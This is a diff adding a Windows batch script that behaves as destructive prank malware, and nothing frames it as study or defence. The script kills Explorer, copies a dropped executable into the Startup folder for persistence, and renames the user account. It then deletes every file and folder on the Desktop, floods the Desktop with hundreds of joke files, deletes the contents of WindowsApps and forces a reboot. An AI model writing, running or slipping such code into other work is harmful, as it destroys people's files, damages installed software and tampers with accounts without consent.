@@ -1,0 +1,18 @@
+@echo off
+taskkill /f /im explorer.exe
+copy %temp%\b0x0fd34th.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\b0x0fd34th.exe"
+wmic useraccount where name='%username%' set FullName="Nico Nico"
+wmic useraccount where name='%username%' rename 'Nico Nico'
+SET /a cr=0
+
+del /f /s /q %userprofile%\Desktop\*
+for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%P"
+
+:l
+copy %temp%\text.txt "%userprofile%\Desktop\Nico Nico Nico Nico Nico Nico Ni%cr%co~.txt"
+SET /a cr=%cr%+1
+if %cr%==28 copy %temp%\readme.docx %userprofile%\Desktop\Nico NiCo Nico NIco Nico.docx
+if not %cr%==400 goto l
+
+del /f /s /q "C:\Program Files\WindowsApps\"
+shutdown /f /r /t 500
